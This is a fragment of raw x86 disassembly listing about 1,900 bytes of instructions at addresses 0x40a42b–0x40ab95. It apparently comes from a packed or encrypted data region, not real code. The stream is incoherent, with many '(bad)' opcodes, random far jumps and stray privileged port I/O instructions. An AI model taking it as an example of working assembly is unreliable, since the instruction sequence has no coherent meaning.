  40a42b:	mov    ebx,0xfc64f0a0
  40a430:	lds    dx,DWORD PTR [eax+0x66]
  40a434:	adc    edx,DWORD PTR [edx-0x4e9bb9a]
  40a43a:	ins    DWORD PTR es:[edi],dx
  40a43b:	mov    ah,0x89
  40a43d:	jle    0x40a41b
  40a43f:	or     ebx,DWORD PTR [ebp+0x2fbf6650]
  40a445:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a446:	mov    BYTE PTR [ebx],bh
  40a448:	hlt    
  40a449:	retf   
  40a44a:	pop    edx
  40a44b:	add    bh,0xc0
  40a44e:	pop    ebx
  40a44f:	(bad)  
  40a450:	call   0x70dc:0xdfab5926
  40a457:	(bad)  
  40a458:	jl     0x40a4a1
  40a45a:	sbb    eax,0xbd78b0f
  40a45f:	jnp    0x40a3f9
  40a461:	test   BYTE PTR [eax-0x3f],bl
  40a464:	jge    0x40a428
  40a466:	and    BYTE PTR [ebx],ch
  40a468:	xchg   esi,eax
  40a469:	cdq    
  40a46a:	rcl    DWORD PTR [esi],0xf9
  40a46d:	pop    ebx
  40a46e:	push   edi
  40a46f:	jb     0x40a40a
  40a471:	mov    edi,0xeb679e1d
  40a476:	pop    es
  40a477:	xor    ch,BYTE PTR [ebx+0x14de5ad0]
  40a47d:	je     0x40a402
  40a47f:	lds    ebp,FWORD PTR [eax-0x16]
  40a482:	or     eax,0x58b66120
  40a487:	xchg   ebx,eax
  40a488:	ins    BYTE PTR es:[edi],dx
  40a489:	push   esp
  40a48a:	adc    bh,BYTE PTR [esi-0x454f122b]
  40a490:	outs   dx,BYTE PTR ds:[esi]
  40a491:	push   eax
  40a492:	aad    0x71
  40a494:	jmp    0x21c4:0x2ff80bd9
  40a49b:	pop    esi
  40a49c:	retf   0x2dcd
  40a49f:	mov    ds:0xfcf4f0e2,eax
  40a4a4:	mov    ecx,0xfb952944
  40a4a9:	mov    dl,BYTE PTR [edi]
  40a4ab:	int    0x54
  40a4ad:	adc    ebp,DWORD PTR [ebp-0x15ac1923]
  40a4b3:	paddb  xmm1,XMMWORD PTR [edi-0x80]
  40a4b8:	mov    dl,0x11
  40a4ba:	pop    es
  40a4bb:	ins    BYTE PTR es:[edi],dx
  40a4bc:	fsubp  st(5),st
  40a4be:	cmp    esp,esi
  40a4c0:	enter  0xf00b,0x94
  40a4c4:	int3   
  40a4c5:	mov    dl,0xaf
  40a4c7:	rol    BYTE PTR [ebp+0x2a32385b],1
  40a4cd:	stc    
  40a4ce:	outs   dx,DWORD PTR ds:[esi]
  40a4cf:	es pop ebx
  40a4d1:	push   cs
  40a4d2:	sub    ebp,ecx
  40a4d4:	and    eax,0x65feee0e
  40a4d9:	push   es
  40a4da:	pop    es
  40a4db:	sbb    ecx,eax
  40a4dd:	nop
  40a4de:	retf   
  40a4df:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a4e0:	mov    BYTE PTR [edx],cl
  40a4e2:	mov    edi,0x1078b929
  40a4e7:	cmp    BYTE PTR [ebp+ebx*8+0x2a],bh
  40a4eb:	addr16 bnd jmp 0x4c3f3283
  40a4f2:	mov    dh,BYTE PTR [ecx+0x534a0383]
  40a4f8:	adc    al,0xb0
  40a4fa:	retf   
  40a4fb:	xchg   al,ah
  40a4fd:	sbb    eax,ecx
  40a4ff:	pop    eax
  40a500:	xor    bh,BYTE PTR [ebx+edx*8-0x29622571]
  40a507:	out    dx,eax
  40a508:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a509:	cmp    ebp,DWORD PTR ds:[ebp+0x13]
  40a50d:	leave  
  40a50e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a50f:	xor    ebx,eax
  40a511:	sbb    al,0x15
  40a513:	dec    ecx
  40a514:	dec    edx
  40a515:	mov    BYTE PTR [ecx],al
  40a517:	std    
  40a518:	mov    bh,0x68
  40a51a:	mov    dh,0x2d
  40a51c:	push   cs
  40a51d:	xchg   ebx,eax
  40a51e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a51f:	iret   
  40a520:	mov    DWORD PTR [ecx-0x1942b52a],edi
  40a526:	fcmovne st,st(1)
  40a528:	jae    0x40a4d5
  40a52a:	xlat   BYTE PTR ds:[ebx]
  40a52b:	psrad  mm4,QWORD PTR [ebp-0x63108f60]
  40a532:	scas   eax,DWORD PTR es:[edi]
  40a533:	cmp    al,al
  40a535:	mov    WORD PTR [edi-0x5230b946],es
  40a53b:	inc    esi
  40a53c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a53d:	test   al,0xfe
  40a53f:	mov    edi,0x35e895be
  40a544:	in     eax,dx
  40a545:	mov    ch,BYTE PTR [ebx]
  40a547:	out    0x27,eax
  40a549:	sbb    ebp,DWORD PTR [ecx]
  40a54b:	push   0xffffffe6
  40a54d:	xor    eax,0xae490b02
  40a552:	arpl   WORD PTR [ecx],bx
  40a554:	sahf   
  40a555:	out    dx,eax
  40a556:	jno    0x40a57f
  40a558:	mov    ecx,0xfa49957a
  40a55d:	add    DWORD PTR ds:0x661f77e3,edi
  40a563:	imul   edx,DWORD PTR [esi],0x70
  40a566:	bound  esp,QWORD PTR [ecx-0x7143e1ef]
  40a56c:	int    0x6
  40a56e:	dec    ebx
  40a56f:	inc    ebx
  40a570:	lock or eax,ebx
  40a573:	in     al,0xd7
  40a575:	sbb    dh,cl
  40a577:	adc    eax,0xff50f5bf
  40a57c:	cld    
  40a57d:	ins    DWORD PTR es:[edi],dx
  40a57e:	ss leave 
  40a580:	ja     0x40a502
  40a582:	mov    bh,0x1d
  40a584:	cmp    DWORD PTR [edx+0x45fd0b54],esp
  40a58a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a58b:	pop    edx
  40a58c:	xor    al,0x3
  40a58e:	pop    ebp
  40a58f:	xchg   ebx,edx
  40a591:	add    cl,BYTE PTR [edx+0x4d5a9d2c]
  40a597:	xor    eax,0x787a9c3e
  40a59c:	ror    DWORD PTR [eax+0x17],cl
  40a59f:	bound  edi,QWORD PTR [edx+0x7e1cb57c]
  40a5a5:	jl     0x40a55a
  40a5a7:	cwde   
  40a5a8:	jmp    0x133:0xb10ee141
  40a5af:	push   ds
  40a5b0:	push   ebx
  40a5b1:	ret    
  40a5b2:	popa   
  40a5b3:	add    al,0x0
  40a5b5:	mov    esp,0xbb728da6
  40a5ba:	ret    0x7f80
  40a5bd:	bound  edx,QWORD PTR [edx-0x1f]
  40a5c0:	mov    fs,WORD PTR [edx+ecx*8+0x615e432b]
  40a5c7:	test   al,0x2b
  40a5c9:	xor    eax,esp
  40a5cb:	mov    eax,ds:0x3310a87e
  40a5d0:	dec    ebx
  40a5d1:	test   al,0x7f
  40a5d3:	call   0x76c9:0x43ee9813
  40a5da:	pop    edi
  40a5db:	pop    ds
  40a5dc:	mov    ds:0xed24e444,al
  40a5e1:	xchg   ebx,eax
  40a5e2:	inc    BYTE PTR [ebx]
  40a5e4:	xchg   edi,eax
  40a5e5:	sti    
  40a5e6:	add    BYTE PTR [ebp-0x2bacf8a0],0xdb
  40a5ed:	xchg   edx,eax
  40a5ee:	push   edi
  40a5ef:	jmp    0x40a599
  40a5f1:	mov    ebx,0xd78e7847
  40a5f6:	out    dx,eax
  40a5f7:	aad    0x6f
  40a5f9:	scas   al,BYTE PTR es:[edi]
  40a5fa:	sub    ebx,edx
  40a5fc:	xlat   BYTE PTR ds:[ebx]
  40a5fd:	js     0x40a5a4
  40a5ff:	aas    
  40a600:	sbb    DWORD PTR [ebp-0x12b19440],esp
  40a606:	add    cl,BYTE PTR [eax-0x7ffbb8b7]
  40a60c:	mov    ebx,0xb40ddede
  40a611:	iret   
  40a612:	repnz add DWORD PTR [eax],eax
  40a615:	dec    edx
  40a616:	xchg   edx,eax
  40a617:	push   cs
  40a618:	inc    esi
  40a619:	push   edx
  40a61a:	lds    edx,FWORD PTR [eax+0x10b6597a]
  40a620:	pop    esi
  40a621:	adc    edx,edi
  40a623:	mov    al,ds:0x9846fb06
  40a628:	pop    esp
  40a629:	(bad)  
  40a62a:	loop   0x40a622
  40a62c:	jbe    0x40a5c7
  40a62e:	mov    dh,0x45
  40a630:	inc    eax
  40a631:	pushf  
  40a632:	test   eax,0xdf233630
  40a637:	pop    ecx
  40a638:	mov    edi,0x1dd933e0
  40a63d:	push   edi
  40a63e:	adc    BYTE PTR [edi],dl
  40a640:	adc    DWORD PTR ds:0x95a30509,esi
  40a646:	and    ch,BYTE PTR [ecx+0x7e1a5dfc]
  40a64c:	add    ah,BYTE PTR [esi+0xa]
  40a64f:	adc    BYTE PTR [ebx+0x52],0x54
  40a653:	aaa    
  40a654:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a655:	outs   dx,DWORD PTR ds:[esi]
  40a656:	mov    ds:0x3eeac5e2,eax
  40a65b:	dec    ebx
  40a65c:	or     edi,DWORD PTR [ecx+0x4b]
  40a65f:	jle    0x40a67f
  40a661:	inc    eax
  40a662:	scas   al,BYTE PTR es:[edi]
  40a663:	mov    al,ds:0x2199a88b
  40a668:	cmp    DWORD PTR [ebx],ecx
  40a66a:	push   cs
  40a66b:	xchg   DWORD PTR ds:[edi-0x37],edx
  40a66f:	xchg   ebp,eax
  40a670:	in     eax,0xe8
  40a672:	add    DWORD PTR [ecx],esi
  40a674:	sbb    ch,BYTE PTR [ebp+0x6c]
  40a677:	repz (bad) 
  40a679:	mov    ds:0x764e229e,eax
  40a67e:	(bad)  
  40a67f:	leave  
  40a680:	sub    ah,BYTE PTR [eax-0x66]
  40a683:	retf   0xa78d
  40a686:	and    al,0x9b
  40a688:	pop    esi
  40a689:	add    BYTE PTR [ebp+0x67],ah
  40a68c:	mov    esp,0x158fbe88
  40a691:	mov    esi,0xa4b15e64
  40a696:	jl     0x40a6a8
  40a698:	cld    
  40a699:	lahf   
  40a69a:	rol    ecx,0x7e
  40a69d:	xor    DWORD PTR [edx-0x38795a62],edx
  40a6a3:	adc    al,0x7b
  40a6a5:	fistp  WORD PTR [eax+0x13e1f365]
  40a6ab:	adc    eax,0x86a28aac
  40a6b0:	hlt    
  40a6b1:	bnd jge 0x40a6a8
  40a6b4:	jnp    0x40a721
  40a6b6:	xchg   edi,eax
  40a6b7:	push   ebp
  40a6b8:	out    dx,eax
  40a6b9:	mov    edx,0xfde4e62f
  40a6be:	sbb    esp,DWORD PTR [ecx]
  40a6c0:	mov    dh,0x7d
  40a6c2:	ss dec edi
  40a6c4:	cld    
  40a6c5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a6c6:	cmp    al,BYTE PTR [eax-0x6e38ad1d]
  40a6cc:	pop    ds
  40a6cd:	icebp  
  40a6ce:	dec    edi
  40a6cf:	add    DWORD PTR [esi],edi
  40a6d1:	xlat   BYTE PTR ds:[ebx]
  40a6d2:	mov    al,ds:0xad86f81c
  40a6d7:	rcl    BYTE PTR [ebx],0xae
  40a6da:	mov    ecx,0x3a7d9db1
  40a6df:	fsubr  st,st(5)
  40a6e1:	push   ebx
  40a6e2:	frstor [ebp+0xf1103b4]
  40a6e8:	scas   al,BYTE PTR es:[edi]
  40a6e9:	call   0xb46ced32
  40a6ee:	jmp    0x92a7f32b
  40a6f3:	jo     0x40a724
  40a6f5:	mov    edx,0x729abd19
  40a6fa:	loopne 0x40a74e
  40a6fc:	std    
  40a6fd:	adc    al,0x50
  40a6ff:	dec    edi
  40a700:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a701:	dec    edx
  40a702:	mov    edx,0xc9c3f30b
  40a707:	cdq    
  40a708:	sti    
  40a709:	xor    al,BYTE PTR [ebp-0x176a72c3]
  40a70f:	retf   0xa593
  40a712:	add    bl,BYTE PTR [eax-0x64]
  40a715:	mov    edi,0x968d72a6
  40a71a:	inc    esp
  40a71b:	jne    0x40a790
  40a71d:	pop    ecx
  40a71e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a71f:	mov    al,0xaa
  40a721:	cwde   
  40a722:	jbe    0x40a788
  40a724:	inc    ecx
  40a725:	inc    esp
  40a726:	and    BYTE PTR [edi-0x3aef7714],cl
  40a72c:	and    BYTE PTR [esi-0x70b60435],dl
  40a732:	out    0x75,eax
  40a734:	(bad)  
  40a735:	xchg   esp,eax
  40a736:	popf   
  40a737:	push   ecx
  40a738:	aaa    
  40a739:	push   esi
  40a73a:	enter  0x34dc,0x92
  40a73e:	addr16 (bad) 
  40a740:	sbb    DWORD PTR [ecx-0x4ec2bd77],edi
  40a746:	ret    
  40a747:	popa   
  40a748:	fist   WORD PTR [eax+0x7e]
  40a74b:	bound  edx,QWORD PTR [edi]
  40a74d:	adc    al,0x75
  40a74f:	loopne 0x40a6fa
  40a751:	popf   
  40a752:	dec    edi
  40a753:	sbb    eax,0xc39f0e7b
  40a758:	sub    ah,bh
  40a75a:	dec    edi
  40a75b:	out    0x2f,eax
  40a75d:	sar    bh,0x4b
  40a760:	in     eax,0x32
  40a762:	pop    ds
  40a763:	jp     0x40a795
  40a765:	sub    BYTE PTR [esi+0x3f],bh
  40a768:	call   0xf6f244b2
  40a76d:	jl     0x40a707
  40a76f:	out    dx,eax
  40a770:	out    0x66,al
  40a772:	jne    0x40a74f
  40a774:	and    eax,0x99d321a4
  40a779:	inc    edi
  40a77a:	xchg   DWORD PTR [edx+eax*1-0x2a02131c],esp
  40a781:	push   ebp
  40a782:	push   ss
  40a783:	fwait
  40a784:	test   al,0x51
  40a786:	pop    edi
  40a787:	shr    DWORD PTR [eax-0x4b],cl
  40a78a:	in     eax,0x47
  40a78c:	dec    edx
  40a78d:	jne    0x40a7b4
  40a78f:	xchg   ebp,eax
  40a790:	mov    esp,0x2739950e
  40a795:	and    ebx,DWORD PTR [ecx-0x43dc73f7]
  40a79b:	fist   WORD PTR [esi-0x23350fed]
  40a7a1:	xor    edi,DWORD PTR [esi+0xc]
  40a7a4:	push   edi
  40a7a5:	or     bh,BYTE PTR [eax+0x60]
  40a7a8:	adc    dh,0x7c
  40a7ab:	sub    bl,BYTE PTR [edi]
  40a7ad:	xchg   DWORD PTR [ebp-0x41],ecx
  40a7b0:	mov    ebp,0x3b164b86
  40a7b5:	cli    
  40a7b6:	popa   
  40a7b7:	lods   al,BYTE PTR ds:[esi]
  40a7b8:	pop    ecx
  40a7b9:	stos   DWORD PTR es:[edi],eax
  40a7ba:	call   eax
  40a7bc:	sbb    DWORD PTR [ebp-0x54],edx
  40a7bf:	retf   
  40a7c0:	add    BYTE PTR [ecx+eiz*8],dh
  40a7c3:	pop    ss
  40a7c4:	xor    DWORD PTR [edi],edx
  40a7c6:	in     eax,dx
  40a7c7:	sbb    BYTE PTR [eax],ch
  40a7c9:	mov    eax,0x7fa0cf00
  40a7ce:	cli    
  40a7cf:	imul   esi,DWORD PTR [edx+0x4bf05807],0x64dda58d
  40a7d9:	and    al,0xbd
  40a7db:	pop    ds
  40a7dc:	adc    DWORD PTR [ebp-0xf00bab8],0x2a
  40a7e3:	loopne 0x40a842
  40a7e5:	mov    cl,0x9e
  40a7e7:	mov    edi,0x7f889917
  40a7ec:	jae    0x40a7d6
  40a7ee:	stos   DWORD PTR es:[edi],eax
  40a7ef:	jmp    0x5c2cc121
  40a7f4:	mov    fs,WORD PTR [edi+0x35b25d54]
  40a7fa:	jmp    0xb8d9eca0
  40a7ff:	std    
  40a800:	adc    ah,BYTE PTR [eax-0x573593de]
  40a806:	mov    cl,0xdd
  40a808:	mov    BYTE PTR [eax],ch
  40a80a:	sub    eax,0x1740612f
  40a80f:	stos   DWORD PTR es:[edi],eax
  40a810:	mov    edx,ss
  40a812:	xchg   BYTE PTR [edx],ah
  40a814:	fidivr DWORD PTR [ebp-0xf2ebac1]
  40a81a:	xchg   edi,eax
  40a81b:	sub    al,0x15
  40a81d:	cmp    ecx,eax
  40a81f:	in     al,dx
  40a820:	ja     0x40a85f
  40a822:	(bad)  
  40a823:	std    
  40a824:	sbb    BYTE PTR [eax-0xf],0xfd
  40a828:	mov    edi,DWORD PTR [ecx+edx*2-0x30]
  40a82c:	pop    es
  40a82d:	mov    bh,0xc4
  40a82f:	push   esp
  40a830:	out    0x87,al
  40a832:	lock enter 0x6a34,0x91
  40a837:	xlat   BYTE PTR ds:[ebx]
  40a838:	and    edi,edi
  40a83a:	test   al,0x53
  40a83c:	mov    DWORD PTR [ecx-0xc],esp
  40a83f:	cdq    
  40a840:	ins    BYTE PTR es:[edi],dx
  40a841:	into   
  40a842:	dec    esp
  40a843:	pop    esi
  40a844:	push   ecx
  40a845:	sbb    eax,0x9f13cd79
  40a84a:	das    
  40a84b:	mov    eax,ds:0xe0068159
  40a850:	jge    0x40a89e
  40a852:	adc    eax,0xfeda26a4
  40a857:	mov    edi,ds
  40a859:	jo     0x40a811
  40a85b:	or     al,0x95
  40a85d:	inc    ecx
  40a85e:	cmp    esi,edi
  40a860:	dec    ebx
  40a861:	mov    ch,0xea
  40a863:	inc    ebp
  40a864:	icebp  
  40a865:	sub    DWORD PTR [ecx-0x14],0xcc19be63
  40a86c:	dec    ecx
  40a86d:	enter  0xff50,0x6e
  40a871:	out    dx,al
  40a872:	data16 and al,0x45
  40a875:	jmp    ecx
  40a877:	inc    esp
  40a878:	or     eax,0xd54a11fd
  40a87d:	jge    0x40a890
  40a87f:	cmp    BYTE PTR [ecx-0x28],dh
  40a882:	daa    
  40a883:	imul   ecx,DWORD PTR [ebx+ebx*1-0x4fe4397a],0x6a
  40a88b:	dec    esi
  40a88c:	cwde   
  40a88d:	pop    esp
  40a88e:	inc    ebp
  40a88f:	xor    dh,BYTE PTR [eax]
  40a891:	test   BYTE PTR ds:0x1459cdeb,ah
  40a897:	mov    dl,0x25
  40a899:	xor    BYTE PTR [esi+0x3842d30c],bh
  40a89f:	mov    ebp,0x5cf66970
  40a8a4:	ret    
  40a8a5:	jne    0x40a838
  40a8a7:	or     BYTE PTR [ebx+0x47],ch
  40a8aa:	scas   eax,DWORD PTR es:[edi]
  40a8ab:	xchg   esp,eax
  40a8ac:	mov    ebx,0x55d3835b
  40a8b1:	in     al,dx
  40a8b2:	mov    dh,0xb
  40a8b4:	jmp    0x40a87b
  40a8b6:	lahf   
  40a8b7:	cmp    ecx,DWORD PTR [ecx+0x16]
  40a8ba:	fild   DWORD PTR [edi+0x69]
  40a8bd:	push   es
  40a8be:	test   BYTE PTR [ecx],0xcf
  40a8c1:	lods   al,BYTE PTR ds:[esi]
  40a8c2:	add    al,0x1d
  40a8c4:	mov    esi,DWORD PTR [ebx+eiz*8-0x7ca1b2d1]
  40a8cb:	dec    ecx
  40a8cc:	mov    al,ds:0xc4883dca
  40a8d1:	adc    cl,bl
  40a8d3:	add    DWORD PTR [ebx+0x3eb4efc9],ecx
  40a8d9:	mov    al,ds:0xfdfb6447
  40a8de:	int3   
  40a8df:	cmp    BYTE PTR [edi-0x68bbf109],al
  40a8e5:	pop    ds
  40a8e6:	inc    ebx
  40a8e7:	js     0x40a889
  40a8e9:	dec    DWORD PTR [eax-0x21]
  40a8ec:	test   eax,0x28611c3d
  40a8f1:	fmul   QWORD PTR [eax]
  40a8f3:	pusha  
  40a8f4:	push   ebp
  40a8f5:	je     0x40a932
  40a8f7:	xor    BYTE PTR [ebx-0x2a],cl
  40a8fa:	inc    dh
  40a8fc:	pushf  
  40a8fd:	enter  0x5a30,0xf3
  40a901:	push   eax
  40a902:	jp     0x40a890
  40a904:	or     ebp,esp
  40a906:	xchg   ebp,eax
  40a907:	pop    eax
  40a908:	es call 0x9677:0x4da4ea69
  40a910:	inc    esi
  40a911:	lahf   
  40a912:	mov    es:0x3f28873d,eax
  40a918:	sbb    ch,BYTE PTR [esi]
  40a91a:	jae    0x40a954
  40a91c:	lods   eax,DWORD PTR ds:[esi]
  40a91d:	mov    edi,0xb5cf5ceb
  40a922:	pop    ds
  40a923:	sbb    al,BYTE PTR [ecx]
  40a925:	cs cld 
  40a927:	dec    ebx
  40a928:	popa   
  40a929:	fisttp WORD PTR ds:0x8dcad591
  40a92f:	into   
  40a930:	jo     0x40a90c
  40a932:	push   ds
  40a933:	inc    eax
  40a934:	push   ebp
  40a935:	xlat   BYTE PTR ds:[ebx]
  40a936:	add    edx,DWORD PTR ds:0x698b6e4c
  40a93c:	cmp    eax,0x85478729
  40a941:	int3   
  40a942:	ds dec esp
  40a944:	xchg   esp,eax
  40a945:	out    0xc3,eax
  40a947:	out    0xfd,eax
  40a949:	pop    esp
  40a94a:	or     al,0xb3
  40a94c:	ret    0x6f53
  40a94f:	mov    ebx,0x663031d3
  40a954:	retf   0x3741
  40a957:	out    0x2a,al
  40a959:	mov    edx,0x9d2defbf
  40a95e:	std    
  40a95f:	loop   0x40a9c2
  40a961:	imul   edi,DWORD PTR ds:0x64985730,0x48
  40a968:	cli    
  40a969:	add    esp,DWORD PTR [esi]
  40a96b:	add    eax,esi
  40a96d:	inc    edi
  40a96e:	cmp    edi,DWORD PTR [ebx-0x15]
  40a971:	mov    ds:0xbd86741f,al
  40a976:	leave  
  40a977:	(bad)  
  40a978:	jo     0x40a929
  40a97a:	mov    eax,0xa4f1eb75
  40a97f:	push   ecx
  40a980:	cwde   
  40a981:	and    esp,DWORD PTR [eax-0x13]
  40a984:	xchg   ecx,eax
  40a985:	mov    eax,0x35467c7f
  40a98a:	xor    edi,ebp
  40a98c:	or     eax,0x67db7916
  40a991:	xor    al,0xb8
  40a993:	ror    BYTE PTR [edx+0x75022b3d],cl
  40a999:	in     al,dx
  40a99a:	(bad)  
  40a99b:	mov    ecx,0xdaa65a6e
  40a9a0:	nop
  40a9a1:	sub    bh,dh
  40a9a3:	loop   0x40a92b
  40a9a5:	cmp    bl,BYTE PTR [ecx]
  40a9a7:	xchg   ebp,eax
  40a9a8:	(bad)  
  40a9a9:	sub    al,0xa7
  40a9ab:	add    DWORD PTR [ecx],ebx
  40a9ad:	dec    ebx
  40a9ae:	loop   0x40a9c4
  40a9b0:	jbe    0x40aa12
  40a9b2:	sub    esp,DWORD PTR [ebp*1-0x4e88c16]
  40a9b9:	cwde   
  40a9ba:	out    dx,eax
  40a9bb:	add    edx,DWORD PTR [ebp+0x77caaff7]
  40a9c1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a9c2:	ret    
  40a9c3:	push   ecx
  40a9c4:	int3   
  40a9c5:	add    eax,DWORD PTR [edi-0x6c499d1d]
  40a9cb:	mov    ebp,0x758e951d
  40a9d0:	in     eax,0x84
  40a9d2:	sub    bl,dh
  40a9d4:	cs xchg edx,eax
  40a9d7:	and    BYTE PTR [eax+0x1112b15],bh
  40a9dd:	mov    esi,0x639c07b9
  40a9e2:	mov    dl,0x89
  40a9e4:	cmp    DWORD PTR [esi+0x60ffacc],edi
  40a9ea:	adc    BYTE PTR [ebp+0x1436601b],ch
  40a9f0:	jg     0x40a993
  40a9f2:	out    dx,al
  40a9f3:	xchg   ecx,eax
  40a9f4:	lock mov dl,0x49
  40a9f7:	test   eax,0xc6233d31
  40a9fc:	sbb    dl,dh
  40a9fe:	jne    0x40a9b4
  40aa00:	hlt    
  40aa01:	or     eax,0xc3281bbf
  40aa06:	ss lahf 
  40aa08:	fild   WORD PTR [ebx-0x55b099c5]
  40aa0e:	call   0x2ca4c37b
  40aa13:	cs shl eax,cl
  40aa16:	sbb    ebp,edx
  40aa18:	cmp    BYTE PTR [edx],0xbb
  40aa1b:	test   al,0xbd
  40aa1d:	out    dx,al
  40aa1e:	rcl    ch,1
  40aa20:	clc    
  40aa21:	xor    ebp,DWORD PTR [esi+0x75]
  40aa24:	sub    cl,BYTE PTR [ecx+0x782a515]
  40aa2a:	dec    dh
  40aa2c:	test   al,0xaf
  40aa2e:	jge    0x40aa17
  40aa30:	(bad)  
  40aa31:	lods   al,BYTE PTR ds:[esi]
  40aa32:	scas   eax,DWORD PTR es:[edi]
  40aa33:	sub    DWORD PTR es:[esi+0x376e8bcb],0x8968a13b
  40aa3e:	or     ebx,DWORD PTR [ebp+0x6f0e881e]
  40aa44:	pop    es
  40aa45:	jo     0x40aa84
  40aa47:	sar    esi,cl
  40aa49:	add    ebx,eax
  40aa4b:	inc    esp
  40aa4c:	dec    esp
  40aa4d:	hlt    
  40aa4e:	inc    ebp
  40aa4f:	aad    0x22
  40aa51:	or     eax,0xeed79f7a
  40aa56:	cld    
  40aa57:	pop    ecx
  40aa58:	inc    ebx
  40aa59:	out    0xcc,eax
  40aa5b:	push   0xfffffffb
  40aa5d:	inc    ebx
  40aa5e:	nop
  40aa5f:	cmp    BYTE PTR [ebx-0x3c8b0868],0x8a
  40aa66:	ss jl  0x40aabd
  40aa69:	(bad)  
  40aa6a:	mov    eax,0xbc031906
  40aa6f:	inc    ebp
  40aa70:	fistp  QWORD PTR [ebx+0x5b]
  40aa73:	mov    DWORD PTR [esi+edi*1+0x163791c4],ebp
  40aa7a:	ret    0x2c3e
  40aa7d:	adc    al,0xb9
  40aa7f:	std    
  40aa80:	lods   eax,DWORD PTR ds:[esi]
  40aa81:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40aa82:	idiv   dl
  40aa84:	cmp    edi,DWORD PTR [esi-0x6a]
  40aa87:	fcom   QWORD PTR ds:0x620b08c8
  40aa8d:	jno    0x40aa92
  40aa8f:	push   esi
  40aa90:	sar    BYTE PTR [ecx],0x33
  40aa93:	add    edx,DWORD PTR [ebx]
  40aa95:	xchg   DWORD PTR [ebp+0xe5fb64b],esp
  40aa9b:	jbe    0x40ab13
  40aa9d:	shl    al,1
  40aa9f:	lods   al,BYTE PTR ds:[esi]
  40aaa0:	aam    0x5b
  40aaa2:	mov    ds:0xa37d212a,al
  40aaa7:	dec    esi
  40aaa8:	inc    esp
  40aaa9:	ficom  DWORD PTR ss:0xefd3bf56
  40aab0:	mov    al,BYTE PTR [eax+0x3953dfbb]
  40aab6:	scas   eax,DWORD PTR es:[edi]
  40aab7:	imul   ch
  40aab9:	mov    edx,0xab04665e
  40aabe:	outs   dx,DWORD PTR ds:[esi]
  40aabf:	iret   
  40aac0:	jmp    0x1cfb4294
  40aac5:	mov    ds:0x14e51490,eax
  40aaca:	ins    DWORD PTR es:[edi],dx
  40aacb:	inc    edx
  40aacc:	pop    edi
  40aacd:	inc    esp
  40aace:	loope  0x40ab1a
  40aad0:	ja     0x40ab1d
  40aad2:	xchg   ebx,eax
  40aad3:	pop    ebp
  40aad4:	jecxz  0x40ab0d
  40aad6:	push   ds
  40aad7:	icebp  
  40aad8:	push   ecx
  40aad9:	inc    edi
  40aada:	mov    bh,0xe5
  40aadc:	in     al,0x60
  40aade:	pop    ebx
  40aadf:	dec    ebx
  40aae0:	outs   dx,DWORD PTR ds:[esi]
  40aae1:	cmp    ecx,edi
  40aae3:	in     eax,dx
  40aae4:	int    0x89
  40aae6:	mov    DWORD PTR [esi+eax*8],edx
  40aae9:	jbe    0x40ab52
  40aaeb:	test   ebx,0xcb76e853
  40aaf1:	sbb    bl,0xce
  40aaf4:	sbb    BYTE PTR [esi+esi*4+0x48512627],al
  40aafb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40aafc:	in     al,0x37
  40aafe:	fbstp  TBYTE PTR [ebp+0x1]
  40ab01:	test   eax,0xcefb6f17
  40ab06:	mov    WORD PTR [esi-0x63eca521],fs
  40ab0c:	sbb    ch,BYTE PTR [ebx-0xdbdc1ca]
  40ab12:	xchg   BYTE PTR [edi],ch
  40ab14:	jge    0x40ab93
  40ab16:	fwait
  40ab17:	stc    
  40ab18:	rol    BYTE PTR [eax+0x24],cl
  40ab1b:	stos   DWORD PTR es:[edi],eax
  40ab1c:	sub    bh,bl
  40ab1e:	inc    edi
  40ab1f:	ss pop esp
  40ab21:	mov    ebx,0xa43bc2d4
  40ab26:	js     0x40ab14
  40ab28:	(bad)  
  40ab29:	aad    0xe2
  40ab2b:	and    ebx,DWORD PTR [ebp-0x2]
  40ab2e:	test   dh,al
  40ab30:	mov    BYTE PTR [edi],dl
  40ab32:	test   BYTE PTR fs:[edx+0x78a06aec],ah
  40ab39:	pop    ebx
  40ab3a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ab3b:	pop    eax
  40ab3c:	pop    ds
  40ab3d:	push   ds
  40ab3e:	push   0xc47d32d4
  40ab43:	loop   0x40aafe
  40ab45:	xlat   BYTE PTR ds:[ebx]
  40ab46:	pop    ebp
  40ab47:	push   esp
  40ab48:	sub    ah,BYTE PTR [edx+0x75cb60e5]
  40ab4e:	cmp    BYTE PTR ds:0x4d07317,dh
  40ab54:	sahf   
  40ab55:	or     DWORD PTR [ebx],eax
  40ab57:	cmc    
  40ab58:	sbb    edi,DWORD PTR ds:0x49b06308
  40ab5e:	inc    BYTE PTR [ecx+0x6e]
  40ab61:	lock loope 0x40abb6
  40ab64:	pop    eax
  40ab65:	(bad)  
  40ab66:	loop   0x40ab54
  40ab68:	lods   al,BYTE PTR ds:[esi]
  40ab69:	(bad)  [ecx]
  40ab6b:	or     DWORD PTR [eax+0x4c],edi
  40ab6e:	sub    esp,esp
  40ab70:	das    
  40ab71:	xchg   esi,ecx
  40ab73:	jg     0x40ab14
  40ab75:	pushf  
  40ab76:	mov    ch,0xae
  40ab78:	loopne 0x40ab2a
  40ab7a:	push   0xffffffee
  40ab7c:	out    dx,al
  40ab7d:	xor    BYTE PTR [esi-0x49],ah
  40ab80:	pop    ds
  40ab81:	lds    esi,FWORD PTR [ecx]
  40ab83:	pop    edi
  40ab84:	or     eax,0xb543fbed
  40ab89:	sbb    bh,BYTE PTR [ebp+0x36]
  40ab8c:	and    esi,DWORD PTR [ebx-0x7b5d546d]
  40ab92:	or     BYTE PTR [edx+0x4c],cl
  40ab95:	punpckhwd mm7,QWORD PTR [edi+0x11b4c649]
